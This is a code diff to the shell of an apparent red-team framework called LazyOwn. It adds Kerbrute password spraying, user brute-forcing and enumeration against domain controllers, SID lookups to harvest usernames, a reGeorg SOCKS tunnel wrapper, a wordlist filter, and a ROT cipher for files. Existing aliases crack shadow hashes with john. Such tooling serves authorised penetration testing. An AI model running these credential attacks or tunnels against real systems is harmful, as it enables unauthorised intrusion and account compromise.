@@ -93,6 +93,7 @@ class LazyOwnShell(cmd2.Cmd):
         "ipy": "sh ipython3",
         "loot": "sh ls /home/$USER/.msf4/loot/ && cp /home/$USER/.msf4/loot/* ./sessions/ -r",
         "ls": "list",
+        "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
         "kvpn":"sh sudo killall openvpn",
         "nmap": "run lazynmap",
         "now": "clock",
@@ -108,8 +109,10 @@ class LazyOwnShell(cmd2.Cmd):
         "tor": "sh sudo bash sessions/tor.sh",
         "ses": "sh ls sessions",
         "sniff": "run lazysniff",
+        "status":"sh git status",
         "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt", 
         "venom": "run lazymsfvenom",
+        "vuln": 'sh echo "    \033[33m[!] Searchspoit\n    \033[34m[!] The Exploit of the Day (you can use the command: cp path/of/exploit to copy exploit to working sessions directory):\033[32m" ;     searchsploit --cve | shuf -n 1 ',
         "wps":"sh sudo bash modules/lazywps.sh",
         "ww": "whatweb",
     }
@@ -6734,18 +6737,15 @@ class LazyOwnShell(cmd2.Cmd):
 
         Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
         """
-
-        # Split the line into parts
+        
         parts = line.split("'", 1)
         if len(parts) != 2:
             print_error("Usage: rot <number> '<string>'")
             return
 
-        # Extract the number and text
         number_str = parts[0].strip()
         text = parts[1].strip().strip("'")
 
-        # Validate the number
         try:
             number = int(number_str)
             if not (1 <= number <= 27):
@@ -6753,10 +6753,55 @@ class LazyOwnShell(cmd2.Cmd):
         except ValueError as e:
             print_error(f"Invalid number: {e}")
             return
-
-        # Apply the rotation
         rotated_text = "".join(rotate_char(c, number) for c in text)
-        print_msg(rotated_text)
+        
+        copy2clip(rotated_text)
+        return
+
+    def do_rotf(self, line):
+        """
+        Apply a ROT (rotation) substitution cipher to the given extension.
+
+        This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 
+
+        Usage:
+            rot <number> '<extension>'
+
+        :param line: The input extension containing the number and the text to be rotated. The format should be '<number> '<extension>' where <number> is the rotation amount and <extension> is the text to be ciphered.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        To manually run this task, provide a number (rotation amount) and a extension in the format `rot <number> '<extension>'`. Ensure the number is between 1 and 27.
+
+        Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
+        """
+
+
+        parts = line.split(" ")
+        print(len(parts))
+        if len(parts) != 2:
+            print_error("Usage: rot <number> extension example: rot 13 js")
+            return
+
+        number_str = parts[0].strip()
+        ext = parts[1].strip()
+        text = get_users_dic(ext)
+
+        try:
+            number = int(number_str)
+            if not (1 <= number <= 27):
+                raise ValueError("Number must be between 1 and 27.")
+        except ValueError as e:
+            print_error(f"Invalid number: {e}")
+            return
+        with open(text, 'r') as file:
+            content = file.read().strip()
+        file_name = text.replace(f".{ext}", f"_rotated_{number}.{ext}")
+        
+        rotated_text = "".join(rotate_char(c, number) for c in content)
+        with open(file_name, 'w') as f:
+            f.write(rotated_text)
         copy2clip(rotated_text)
         return
 
@@ -10382,10 +10427,14 @@ class LazyOwnShell(cmd2.Cmd):
         - The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
         - The file sessions/users.txt should exist and contain the list of usernames to enumerate.
         """
-        if not is_binary_present("kerbrute_linux_amd64"):
-            print_warn("Attemp to install kerbrute...")
-            cmd = "go get github.com/ropnop/kerbrute"
-            os.system(cmd)
+        path = os.getcwd()
+        kerbrute_dir = f"{path}/external/.exploit/kerbrute"
+        github = f"git clone https://github.com/ropnop/kerbrute.git {kerbrute_dir}"
+        if not is_binary_present("kerbrute"):
+            print_warn("Kerbrute is not found, Attemp to compile kerbrute...")
+            os.system(github)
+            compile = "go build -ldflags \"-s -w\" . "
+            os.system(f"cd {kerbrute_dir} && {compile} && upx kerbrute")
 
         url = self.params["url"]
         rhost = self.params["rhost"]
@@ -10407,7 +10456,7 @@ class LazyOwnShell(cmd2.Cmd):
                     params = file_line.split(":")
                     user = params[0]
                     passwd = params[1].replace("\n", "")
-                    command = f"kerbrute_linux_amd64 passwordspray --dc {rhost} -d {domain} -t 20 -v {users_txt} '{passwd}'"
+                    command = f"{kerbrute_dir}/kerbrute passwordspray --dc {rhost} -d {domain} -t 20 -v {users_txt} '{passwd}' | tee sessions/kerbrute_{rhost}_{line}.txt"
                     print_msg(command)
                     os.system(command)
 
@@ -10419,7 +10468,7 @@ class LazyOwnShell(cmd2.Cmd):
             with open(users_txt, "r") as file:
                 for user in file:
                     user = user.strip()
-                    command = f"kerbrute_linux_amd64 bruteuser --dc {rhost} -d {domain} -t 20 -v {wordlist} {user}"
+                    command = f"{kerbrute_dir}/kerbrute bruteuser --dc {rhost} -d {domain} -t 20 -v {wordlist} {user}   | tee sessions/kerbrute_{rhost}_{line}.txt"
                     print_msg(command)
                     os.system(command)                
         else:
@@ -10428,13 +10477,13 @@ class LazyOwnShell(cmd2.Cmd):
                 dc = f" --dc {subdomain} "
             else:
                 dc= ""
-            command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} {dc} -t 20 -v {users_txt} "
+            command = f"{kerbrute_dir}/kerbrute userenum --dc {rhost} -d {domain} {dc} -t 20 -v {users_txt}  | tee sessions/kerbrute_{rhost}_userenum.txt"
             print_msg(command)
             os.system(command)
             choice = input("Extend with larger dic ? (y/n)") or 'y'
             if choice == 'y':
                 users = self.params["usrwordlist"]
-                command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} -t 20 -v {users} "
+                command = f"{kerbrute_dir}/kerbrute userenum --dc {rhost} -d {domain} -t 20 -v {users}  | tee sessions/kerbrute_{rhost}_userenum_rockyou.txt"
                 print_msg(command)
                 os.system(command)
         return
@@ -10612,6 +10661,7 @@ class LazyOwnShell(cmd2.Cmd):
             
             credentials = get_credentials()
             if not credentials:
+                print_error(f"error {credentials}")
                 return  
             ask = input("    [?] Do you pass a powershell ? (y/n): ") or 'n'
             if ask == "y":
@@ -16904,6 +16954,7 @@ class LazyOwnShell(cmd2.Cmd):
                 command = f"lookupsid.py {domain}/{user}:{passwd}@{rhost}"
                 print_msg(command)
                 os.system(command)
+                os.system(f"{command}  | grep 'SidTypeUser' | sed 's/.*\\\ (.*\) (SidTypeUser)/\1/' > usernames.txt")
             return
 
         elif line == "dc-target":
@@ -17350,6 +17401,90 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try {command}")
         os.system(command)
         return
+
+    def do_regeorg(self, line):
+        """
+        Executes the reGeorg tool for HTTP(s) tunneling through a SOCKS proxy.
+
+        This function performs the following actions:
+        1. Checks if the reGeorg tool is installed; if not, it clones the repository and sets up the environment.
+        2. Validates the command line arguments, specifically the port and URL required for the SOCKS proxy.
+        3. Constructs the command to run the reGeorg SOCKS proxy with the specified options and executes it.
+        4. Provides usage instructions in case of incorrect command line argument formats.
+
+        Parameters:
+        line (str): Command argument specifying the parameters for the reGeorg execution.
+                    - The expected format is: "<port> <url>", where <port> is the listening port and <url> is the URL 
+                    containing the tunnel script.
+        
+        Returns:
+        None
+        """
+        lport = self.params["lport"]
+        url = self.params["url"]
+        path = os.getcwd()
+        reGeorg_git = "https://github.com/sensepost/reGeorg.git"
+        reGeorg_dir = os.path.join(path, "external/.exploit/reGeorg")
+
+        if not os.path.exists(reGeorg_dir):
+            print_msg("Cloning reGeorg repository...")
+            os.system(f"git clone {reGeorg_git} {reGeorg_dir}")
+        else:
+            print_msg("reGeorg already installed, skipping setup.")
+
+        if line:
+            args = line.split()
+            if len(args) != 2:
+                print_error("Incorrect usage. Use: <port> <url> to start the reGeorg SOCKS proxy.")
+                return
+
+            listen_port = args[0]
+            url = args[1]
+        else:
+            listen_port = input(f"    [!] Enter the port (default {lport}): ") or lport
+            url = input(f"    [!] Enter the url (default {url}): ") or url
+
+        command = f"python2 {reGeorg_dir}/reGeorgSocksProxy.py -p {listen_port} -u {url}"
+        print_msg(f"Executing command: {command}")
+        os.system(command)
+        return
+
+    def do_rocky(self, line):
+        """
+        Reduces a wordlist based on the specified password length.
+
+        This function filters the provided wordlist to only include passwords
+        that match the specified length. If no length is provided, it defaults
+        to 4. The function constructs a grep command to achieve this and executes
+        it.
+
+        Usage:
+            do_rocky(line: str)
+
+        :param line: The length of the passwords to filter in the wordlist.
+                    This parameter should be a string representing a positive integer.
+                    If not provided, the function prompts the user for input.
+        :type line: str
+        :raises ValueError: If the provided length is not a valid positive integer.
+        
+        Example:
+            do_rocky('8')
+            # Executes: grep '^.\{8\}$' /usr/share/wordlists/rockyou.txt > sessions/lazypass_mini_rocky.txt
+        """
+        wordlist = self.params["wordlist"]
+
+        if not line:
+            line = input("    [!] Enter the lenght of the passwords to reduce your wordlist(default 4): ") or '4'
+        
+        if not line.isdigit() or int(line) <= 0:
+            print_error("Length must be a positive integer.")
+            return
+    
+        command = "grep '^.\{" + str(line) + "\}$' " + wordlist + " > sessions/lazypass_mini_rocky.txt"
+        print_msg(command)
+        os.system(command)
+
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
